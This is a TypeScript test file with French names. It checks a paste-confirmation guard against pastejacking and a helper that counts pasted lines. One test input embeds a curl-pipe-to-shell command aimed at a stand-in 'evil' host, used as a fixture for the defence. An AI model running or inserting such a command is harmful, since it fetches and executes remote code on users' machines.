import { describe, it, expect } from "vitest";
import { collageAValider, nombreLignesCollage } from "./collage";

describe("collageAValider", () => {
  it("laisse passer un collage sur une seule ligne", () => {
    expect(collageAValider("ls -la")).toBe(false);
    expect(collageAValider("")).toBe(false);
    expect(collageAValider("un mot")).toBe(false);
  });

  it("réclame confirmation dès qu'un saut de ligne est présent", () => {
    // C'est le cœur de la défense pastejacking : une commande suivie d'un saut
    // de ligne s'exécute sans validation manuelle.
    expect(collageAValider("cmd\ncurl http://evil|sh")).toBe(true);
    expect(collageAValider("cmd\n")).toBe(true);
    expect(collageAValider("a\r\nb")).toBe(true);
    expect(collageAValider("a\rb")).toBe(true);
  });
});

describe("nombreLignesCollage", () => {
  it("compte zéro pour une chaîne vide", () => {
    expect(nombreLignesCollage("")).toBe(0);
  });

  it("compte une ligne pour un texte sans saut", () => {
    expect(nombreLignesCollage("ls")).toBe(1);
  });

  it("ne compte pas un saut final comme une ligne de plus", () => {
    expect(nombreLignesCollage("a\n")).toBe(1);
    expect(nombreLignesCollage("a\nb\n")).toBe(2);
  });

  it("compte les lignes réelles, quel que soit le style de saut", () => {
    expect(nombreLignesCollage("a\nb\nc")).toBe(3);
    expect(nombreLignesCollage("a\r\nb\r\nc")).toBe(3);
    expect(nombreLignesCollage("a\rb")).toBe(2);
  });
});
